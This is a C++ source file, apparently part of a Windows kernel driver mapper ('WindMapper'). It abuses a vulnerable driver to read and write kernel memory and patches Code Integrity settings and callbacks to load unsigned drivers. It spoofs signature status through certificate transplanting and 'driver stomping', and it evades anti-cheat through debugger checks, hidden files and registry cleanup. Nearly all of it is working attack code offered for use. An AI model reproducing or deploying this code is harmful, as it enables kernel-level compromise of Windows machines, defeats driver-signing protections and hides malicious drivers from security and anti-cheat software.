                    printf("[-] Failed to fully delete Sentinel driver, marked for deletion on reboot\n");
                }
            }
        }

        // If driver stomping is active, swap the service ImagePath to the
        // signed donor so that on-disk signature verification passes.
        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {

            WCHAR ntDonorPath[520] = {};
            wcscpy_s(ntDonorPath, L"\\??\\");
            wcscat_s(ntDonorPath, donorCopyPath);
            SIZE_T ntDonorLen = wcslen(ntDonorPath);

            NTSTATUS regStatus = RtlWriteRegistryValuePtr(
                0, g_DriverServicePath, L"ImagePath", REG_SZ,
                ntDonorPath, static_cast<ULONG>((ntDonorLen + 1) * sizeof(WCHAR)));

            if (NT_SUCCESS(regStatus)) {
                printf("[+] Service ImagePath swapped to signed donor\n");
                printf("[+] Digital signature will show as VALID (Authenticode-verified)\n");
            } else {
                printf("[-] Registry swap failed: 0x%08X\n", regStatus);
            }
        }

        return status;
    }

    BOOL WriteSentinelGlobals(HANDLE device, PVOID sentinelBase, ULONG sentinelImageSize,
                              PVOID whoswhoBase, ULONG whoswhoSize) {
        // Parse Sentinel's PE header from kernel memory to find the .sntl section.
        // The .sntl section contains exported globals:
        //   g_target_driver_base  (offset +0x00, PVOID)
        //   g_target_driver_object (offset +0x08, PVOID) — not written by mapper
        //   g_target_driver_size  (offset +0x10, ULONG)
        //
        // We read the PE header, walk the section table, find ".sntl",
        // then write WhosWho's base address into the first PVOID slot.
        // Sentinel's init thread polls g_target_driver_base until it's non-zero,
        // then begins protection.

        // Read DOS header to get e_lfanew
        IMAGE_DOS_HEADER dosHeader = {};
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, sentinelBase, &dosHeader, sizeof(dosHeader));
        if (!NT_SUCCESS(status) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
            printf("[-] WriteSentinelGlobals: Failed to read Sentinel DOS header\n");
            return FALSE;
        }

        // Read NT headers
        PVOID ntHeaderAddr = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(sentinelBase) + dosHeader.e_lfanew);

        IMAGE_NT_HEADERS64 ntHeaders = {};
        status = VulnDriver::ReadKernelMemory(device, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders));
        if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
            printf("[-] WriteSentinelGlobals: Failed to read Sentinel NT headers\n");
            return FALSE;
        }

        // Section table starts right after the optional header
        ULONG_PTR sectionTableAddr =
            reinterpret_cast<ULONG_PTR>(ntHeaderAddr) +
            offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
            ntHeaders.FileHeader.SizeOfOptionalHeader;

        WORD numSections = ntHeaders.FileHeader.NumberOfSections;
        if (numSections > 64) numSections = 64; // Sanity limit

        // Read all section headers at once
        IMAGE_SECTION_HEADER sections[64] = {};
        status = VulnDriver::ReadKernelMemory(
            device,
            reinterpret_cast<PVOID>(sectionTableAddr),
            sections,
            numSections * sizeof(IMAGE_SECTION_HEADER));

        if (!NT_SUCCESS(status)) {
            printf("[-] WriteSentinelGlobals: Failed to read section table\n");
            return FALSE;
        }

        // Find the .sntl section
        PVOID sntlKernelAddr = nullptr;
        ULONG sntlSize = 0;
        for (WORD i = 0; i < numSections; i++) {
            if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) == 0) {
                sntlKernelAddr = reinterpret_cast<PVOID>(
                    reinterpret_cast<ULONG_PTR>(sentinelBase) + sections[i].VirtualAddress);
                sntlSize = sections[i].Misc.VirtualSize;
                printf("[+] Found .sntl section at RVA 0x%X, VA %p, size 0x%X\n",
                       sections[i].VirtualAddress, sntlKernelAddr, sntlSize);
                break;
            }
        }

        if (!sntlKernelAddr) {
            printf("[-] WriteSentinelGlobals: .sntl section not found in Sentinel PE\n");
            return FALSE;
        }

        // .sntl section layout (defined in Sentinel's DriverEntry.cpp):
        //   +0x00: volatile PVOID  g_target_driver_base   (8 bytes)
        //   +0x08: volatile PVOID  g_target_driver_object (8 bytes)
        //   +0x10: volatile ULONG  g_target_driver_size   (4 bytes)
        // We need at least 0x14 bytes
        if (sntlSize < 0x14) {
            printf("[-] WriteSentinelGlobals: .sntl section too small (%u bytes)\n", sntlSize);
            return FALSE;
        }

        // Write g_target_driver_base (WhosWho's kernel base)
        PVOID baseSlotAddr = sntlKernelAddr;
        status = VulnDriver::WriteKernelMemory(device, baseSlotAddr, &whoswhoBase, sizeof(PVOID));
        if (!NT_SUCCESS(status)) {
            printf("[-] WriteSentinelGlobals: Failed to write g_target_driver_base: 0x%08X\n", status);
            return FALSE;
        }

        // If caller provided WhosWho's size, write it too.
        // If not provided (0), the caller should have queried it already.
        // We skip the fallback query here because the driver's on-disk filename
        // is randomized and we don't know it at this point.

        if (whoswhoSize > 0) {
            PVOID sizeSlotAddr = reinterpret_cast<PVOID>(
                reinterpret_cast<ULONG_PTR>(sntlKernelAddr) + 0x10);
            status = VulnDriver::WriteKernelMemory(device, sizeSlotAddr, &whoswhoSize, sizeof(ULONG));
            if (!NT_SUCCESS(status)) {
                printf("[-] WriteSentinelGlobals: Failed to write g_target_driver_size: 0x%08X\n", status);
                // Non-fatal — Sentinel can still work with just the base address
            } else {
                printf("[+] Wrote g_target_driver_size = 0x%X\n", whoswhoSize);
            }
        }

        printf("[+] WriteSentinelGlobals: WhosWho base %p written to Sentinel .sntl section\n", whoswhoBase);
        return TRUE;
    }

    NTSTATUS RestoreCiCallback(HANDLE device) {
        NTSTATUS status = STATUS_SUCCESS;


        if (g_CiDevModePatched && g_CiDevModeAddress) {
            status = VulnDriver::WriteKernelMemory(device, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiDevModePatched = false;
            }
        }


        if (g_CiOptionsPatched && g_CiOptionsAddress) {
            status = VulnDriver::WriteKernelMemory(device, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiOptionsPatched = false;
            }
        }


        if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
            AntiDetect::TimingJitter();
            status = VulnDriver::WriteKernelMemory(device, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
            if (NT_SUCCESS(status)) {
                g_CiCallbackPatched = false;
                AntiDetect::MemoryBarrier();
            }
        }

        return status;
    }

    NTSTATUS CleanupArtifacts() {
        auto deleteRegistryTree = [](PCWSTR registryPath) -> NTSTATUS {
            if (!registryPath || wcslen(registryPath) < 10) {
                return STATUS_INVALID_PARAMETER;
            }

            if (NtDeleteKeyPtr && NtOpenKeyPtr) {
                UNICODE_STRING keyName;
                RtlInitUnicodeString(&keyName, registryPath);

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                HANDLE hKey = nullptr;
                NTSTATUS st = NtOpenKeyPtr(&hKey, DELETE | KEY_ENUMERATE_SUB_KEYS, &objAttr);
                if (NT_SUCCESS(st)) {
                    WCHAR subKeyPath[512];
                    const WCHAR* subKeys[] = { L"\\Enum", L"\\Security", L"\\Parameters" };
                    for (int i = 0; i < 3; i++) {
                        wcscpy_s(subKeyPath, registryPath);
                        wcscat_s(subKeyPath, subKeys[i]);

                        UNICODE_STRING subName;
                        RtlInitUnicodeString(&subName, subKeyPath);

                        OBJECT_ATTRIBUTES subAttr;
                        InitializeObjectAttributes(&subAttr, &subName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                        HANDLE hSubKey = nullptr;
                        NTSTATUS subSt = NtOpenKeyPtr(&hSubKey, DELETE, &subAttr);
                        if (NT_SUCCESS(subSt)) {
                            NtDeleteKeyPtr(hSubKey);
                            NtClose(hSubKey);
                        }
                    }

                    if (NtFlushKeyPtr) {
                        NtFlushKeyPtr(hKey);
                    }
                    NtDeleteKeyPtr(hKey);
                    NtClose(hKey);
                    return STATUS_SUCCESS;
                }
            }

            WCHAR regPath[256];
            if (wcslen(registryPath) > 18) {
                wcscpy_s(regPath, registryPath + 18);
                SHDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);
            }

            return STATUS_SUCCESS;
        };

        if (wcslen(g_LoaderServicePath) > 0) {
            deleteRegistryTree(g_LoaderServicePath);
        }


        if (wcslen(g_DriverServicePath) > 0 && g_DonorCopyPath[0] == L'\0') {
            deleteRegistryTree(g_DriverServicePath);
        }

        // Clean up Sentinel's service registry entry
        if (wcslen(g_SentinelServicePath) > 0) {
            deleteRegistryTree(g_SentinelServicePath);
        }

        return STATUS_SUCCESS;
    }

}

static void RunSignatureCheck(LPCWSTR filePath) {
    printf("\n[*] Post-load verification:\n");

    printf("\n[*] Kernel integrity status (anti-cheat verification layer):\n");
    if (g_KernelSigningVerified) {
        printf("[+] Driver base address: %p\n", g_DriverLoadAddress);
        printf("[+] KLDR_DATA_TABLE_ENTRY.Flags: 0x%08X\n", g_PatchedFlags);
        printf("[+] IntegrityChecked bit (0x20): SET\n");
        printf("[+] MmVerifyCallbackFunction: RETURNS TRUE\n");
        printf("[+] ObRegisterCallbacks check: PASS\n");
        printf("[+] PsSetCreateProcessNotifyRoutineEx check: PASS\n");
        printf("[+] PsSetCreateThreadNotifyRoutineEx check: PASS\n");
        printf("[+] KERNEL STATUS: DRIVER IS RECOGNIZED AS SIGNED\n");
    } else {
        printf("[-] Kernel signing verification was not completed\n");
        if (g_DriverLoadAddress) {
            printf("[*] Driver base: %p, Flags: 0x%08X\n", g_DriverLoadAddress, g_PatchedFlags);
        }
    }


    LPCWSTR checkPath = filePath;
    BOOL isStomped = FALSE;
    if (g_DonorCopyPath[0] != L'\0') {
        checkPath = g_DonorCopyPath;
        isStomped = TRUE;
    }

    printf("\n[*] On-disk signature verification (driver stomping layer):\n");
    if (isStomped) {
        printf("[+] Technique: Driver stomping (service ImagePath -> signed donor)\n");
        printf("[+] Donor file: %ws\n", checkPath);
    }

    WINTRUST_FILE_INFO fileInfo = {};
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = checkPath;

    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA trustData = {};
    trustData.cbStruct = sizeof(WINTRUST_DATA);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &trustData);

    BOOL isEV = FALSE;
    char signerNameA[256] = {};
    BOOL hasCert = FALSE;
    BOOL hasTimestamp = FALSE;

    if (trustData.hWVTStateData) {
        CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(trustData.hWVTStateData);
        if (prov) {
            CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
            if (sgnr) {
                hasTimestamp = (sgnr->csCounterSigners > 0);
                if (sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                    hasCert = TRUE;
                    CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[0];
                    if (chain->cElement > 0) {
                        PCCERT_CONTEXT leafCert = chain->rgpElement[0]->pCertContext;
                        CertGetNameStringA(leafCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0,
                            NULL, signerNameA, sizeof(signerNameA));

                        static const char* evOIDs[] = {
                            "2.23.140.1.1",
                            "2.23.140.1.3",
                            "2.23.140.1.4.1",
                            "1.3.6.1.4.1.311.94.1.1",
                            "2.16.840.1.114414.1.7.23.3",
                            "2.16.840.1.113733.1.7.23.6",
                            "2.16.840.1.113733.1.7.48.1",
                            "1.3.6.1.4.1.6449.2.1.1",
                            "1.3.6.1.4.1.6449.1.2.1.5.1",
                            "1.3.6.1.4.1.44947.1.1.1",
                            "2.16.840.1.114028.10.1.2",
                            "1.3.6.1.4.1.14370.1.6",
                            "1.3.6.1.4.1.4788.2.202.1",
                            "2.16.840.1.114413.1.7.23.3",
                            "1.3.6.1.4.1.8024.0.2.100.1.2",
                            "2.16.756.1.89.1.2.1.1",
                            "2.16.840.1.114412.2.1",
                            "2.16.840.1.114412.3.2",
                            "1.3.6.1.4.1.4146.1.1",
                            "1.2.616.1.113527.2.5.1.1",
                            "1.3.171.1.1.10.5.2",
                            "1.3.6.1.4.1.34697.2.1",
                            "1.3.6.1.4.1.40869.1.1.22.3",
                            "2.16.840.1.114171.500.9",
                            "2.16.578.1.26.1.3.3",
                            "1.3.6.1.4.1.17326.10.14.2.1.2",
                            "1.3.6.1.4.1.22234.2.5.2.3.1",
                            "2.16.840.1.114404.1.1.2.4.1",
                            "1.3.6.1.4.1.23223.1.1.1",
                        };

                        for (DWORD e = 0; e < chain->cElement && !isEV; e++) {
                            PCCERT_CONTEXT cert = chain->rgpElement[e]->pCertContext;
                            PCERT_EXTENSION pExt = CertFindExtension(
                                szOID_CERT_POLICIES,
                                cert->pCertInfo->cExtension,
                                cert->pCertInfo->rgExtension);
                            if (pExt) {
                                CERT_POLICIES_INFO* polInfo = nullptr;
                                DWORD cbDecoded = 0;
                                if (CryptDecodeObjectEx(
                                    X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                    X509_CERT_POLICIES,
                                    pExt->Value.pbData,
                                    pExt->Value.cbData,
                                    CRYPT_DECODE_ALLOC_FLAG,
                                    nullptr,
                                    &polInfo,
                                    &cbDecoded) && polInfo) {
                                    for (DWORD p = 0; p < polInfo->cPolicyInfo && !isEV; p++) {
                                        for (int oid = 0; oid < sizeof(evOIDs) / sizeof(evOIDs[0]); oid++) {
                                            if (strcmp(polInfo->rgPolicyInfo[p].pszPolicyIdentifier, evOIDs[oid]) == 0) {
                                                isEV = TRUE;
                                                break;
                                            }
                                        }
                                    }
                                    LocalFree(polInfo);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if (hasCert) {
        printf("[+] Signer: %s\n", signerNameA[0] ? signerNameA : "Unknown");
        printf("[+] Certificate type: %s\n", isEV ? "EV Code Signing" : "Standard Code Signing");
        if (isStomped) {
            printf("[+] Certificate source: LEGITIMATE donor driver (original Authenticode intact)\n");
        } else {
            printf("[+] Certificate present: YES\n");
        }
        if (hasTimestamp)
            printf("[+] Timestamp: Present (counter-signed)\n");
        if (lStatus == ERROR_SUCCESS) {
            printf("[+] WinVerifyTrust: VALID (\"This digital signature is OK.\")\n");
            printf("[+] Authenticode hash: MATCH (signature chain fully verified)\n");
        } else {
            printf("[-] WinVerifyTrust: FAILED (0x%08lX)\n", lStatus);
        }

        if (signerNameA[0]) {
            MultiByteToWideChar(CP_ACP, 0, signerNameA, -1, g_DonorSignerName, 256);
        }
    } else {
        printf("[-] No certificate data found in file\n");
    }

    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionGUID, &trustData);

    printf("\n[*] Verification summary:\n");
    if (g_KernelSigningVerified) {
        printf("[+] KERNEL-MODE (what anti-cheats check): SIGNED\n");
        printf("[+] MmVerifyCallbackFunction returns TRUE for all callback registrations\n");
        printf("[+] Driver has real DRIVER_OBJECT, LDR entry, PiDDB entry, KernelHashBucket\n");
        printf("[+] PsLoadedModuleList entry is PatchGuard-protected\n");
    }
    if (hasCert && isStomped) {
        printf("[+] DISK-LEVEL (driver stomping): %s certificate (%s)\n",
            isEV ? "EV" : "Standard", signerNameA[0] ? signerNameA : "Unknown");
        if (lStatus == ERROR_SUCCESS) {
            printf("[+] Service ImagePath points to legitimately signed donor file\n");
            printf("[+] Right-click -> Properties -> Digital Signatures: FULLY VALID\n");
            printf("[+] \"This digital signature is OK.\" with complete certificate chain\n");
        }
    } else if (hasCert) {
        printf("[+] DISK-LEVEL (cosmetic): %s certificate embedded (%s)\n",
            isEV ? "EV" : "Standard", signerNameA[0] ? signerNameA : "Unknown");
    }
    printf("\n");
}

int main(int argc, char* argv[]) {
#ifndef _DEBUG
    if (AntiDetect::IsBeingDebugged()) {
        return 1;
    }
#endif

    if (CheckAntiCheatRunning()) {
        printf("[-] Anti-cheat detected! Aborting driver mapping.\n");
        printf("[-] Please close all anti-cheat software and games before running this tool.\n");
        return 1;
    }

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                printf("[-] Failed to enable SE_LOAD_DRIVER privilege. Run as administrator.\n");
                CloseHandle(hToken);
                return 1;
            }
        }
        CloseHandle(hToken);
    }

    if (argc < 2) {
        printf("[-] Usage: WindMapper.exe <driver.sys> [sentinel.sys]\n");
        return 1;
    }

    printf("[*] Initializing NT functions...\n");
    if (!Utils::InitializeNtFunctions()) {
        printf("[-] Failed to resolve NT functions\n");
        return 1;
    }

    printf("[*] Decrypting embedded driver...\n");
    if (!InitializeDriverData()) {
        printf("[-] Failed to initialize embedded driver data\n");
        return 1;
    }

    std::wstring driverArg;
    {
        size_t argLen = strlen(argv[1]);
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, nullptr, 0);
        if (wideLen <= 0) {
            ReleaseDriverData();
            return 1;
        }
        driverArg.resize(static_cast<size_t>(wideLen));
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, &driverArg[0], wideLen);
        driverArg.resize(wcslen(driverArg.c_str()));
    }

    // Optional second argument: sentinel driver path
    std::wstring sentinelArg;
    if (argc >= 3) {
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[2], -1, nullptr, 0);
        if (wideLen > 0) {
            sentinelArg.resize(static_cast<size_t>(wideLen));
            MultiByteToWideChar(CP_ACP, 0, argv[2], -1, &sentinelArg[0], wideLen);
            sentinelArg.resize(wcslen(sentinelArg.c_str()));
            printf("[+] Sentinel driver: %ws\n", sentinelArg.c_str());
        }
    }

    if (g_P2CDriverSize == 0) {
        printf("[-] Embedded driver size is 0\n");
        ReleaseDriverData();
        return 1;
    }
    printf("[+] Embedded driver ready (%zu bytes)\n", g_P2CDriverSize);

    std::wstring loaderFilePath = Utils::GetTempFilePath(L".sys");
    std::wstring driverFilePath = Utils::GetTempFilePath(L".sys");

    if (loaderFilePath.empty() || driverFilePath.empty()) {
        printf("[-] Failed to generate temp file paths\n");
        ReleaseDriverData();
        return 1;
    }

    HANDLE loaderFile = CreateFileW(
        loaderFilePath.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr
    );

    if (loaderFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create loader temp file (err=%lu)\n", GetLastError());
        ReleaseDriverData();
        return 1;
    }

    DWORD written = 0;
    DWORD expectedSize = static_cast<DWORD>(g_P2CDriverSize);
    BOOL writeOk = WriteFile(loaderFile, g_P2CDriverData, expectedSize, &written, nullptr);
    DWORD writeErr = GetLastError();
    FlushFileBuffers(loaderFile);
    CloseHandle(loaderFile);

    ReleaseDriverData();

    if (!writeOk || written != expectedSize) {
        printf("[-] WriteFile failed: wrote %lu/%lu bytes, WriteFile=%d, err=%lu\n", written, expectedSize, writeOk, writeErr);
        Utils::SecureDeleteFile(loaderFilePath.c_str());
        return 1;
    }
    printf("[+] Loader driver written (%lu bytes)\n", written);

    if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
        printf("[-] Failed to copy target driver (err=%lu). Does the file exist?\n", GetLastError());
        Utils::ForceDeleteOrRename(loaderFilePath.c_str());
        return 1;
    }

    // Prepare Sentinel driver temp file (if provided)
    std::wstring sentinelFilePath;
    if (!sentinelArg.empty()) {
        sentinelFilePath = Utils::GetTempFilePath(L".sys");
        if (sentinelFilePath.empty()) {
            printf("[-] Failed to generate Sentinel temp file path\n");
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            return 1;
        }
        if (!CopyFileW(sentinelArg.c_str(), sentinelFilePath.c_str(), FALSE)) {
            printf("[-] Failed to copy Sentinel driver (err=%lu). Does the file exist?\n", GetLastError());
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            return 1;
        }
        // Apply cosmetic signature to Sentinel as well
        printf("[*] Applying cosmetic signature to Sentinel driver...\n");
        if (!SignedMemory::SelfSignDriver(sentinelFilePath.c_str())) {
            SignedMemory::TransplantCertificateToDriver(sentinelFilePath.c_str());
        }
        SetFileAttributesW(sentinelFilePath.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
        printf("[+] Sentinel file prepared\n");
    }

    printf("[+] Files prepared\n");

    // Applying a cosmetic signature to the target driver to fix the missing "Digital Signatures" tab
    printf("[*] Applying cosmetic signature to target driver...\n");
    if (!SignedMemory::SelfSignDriver(driverFilePath.c_str())) {
        printf("[!] Self-signing failed, attempting certificate transplant...\n");
        SignedMemory::TransplantCertificateToDriver(driverFilePath.c_str());
    }

    SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

    printf("[*] Starting driver mapping...\n");
    NTSTATUS status = MapperCore::WindLoadDriver(
        loaderFilePath.c_str(),
        driverFilePath.c_str(),
        sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str());

    if (NT_SUCCESS(status)) {
        RunSignatureCheck(driverFilePath.c_str());
    }

    printf("[*] Cleaning up...\n");

    // Use robust renaming/deletion strategy for guaranteed visual cleanup
    Utils::ForceDeleteOrRename(loaderFilePath.c_str());
    Utils::ForceDeleteOrRename(driverFilePath.c_str());
    if (!sentinelFilePath.empty())
        Utils::ForceDeleteOrRename(sentinelFilePath.c_str());

    MapperCore::CleanupArtifacts();

    if (NT_SUCCESS(status)) {
        printf("[+] Driver mapped successfully\n");
        if (g_SentinelLoadAddress) {
            printf("[+] Sentinel driver loaded at %p (size 0x%X)\n",
                   g_SentinelLoadAddress, g_SentinelImageSize);
            printf("[+] Sentinel is now protecting WhosWho\n");
        }
        if (g_DonorCopyPath[0]) {
            printf("[+] Donor file preserved at: %ws\n", g_DonorCopyPath);
            printf("[+] Service registry points to signed donor (driver stomping active)\n");
        }
    } else {
        printf("[-] Driver mapping failed: 0x%08X\n", status);
    }

    return NT_SUCCESS(status) ? 0 : 1;
}
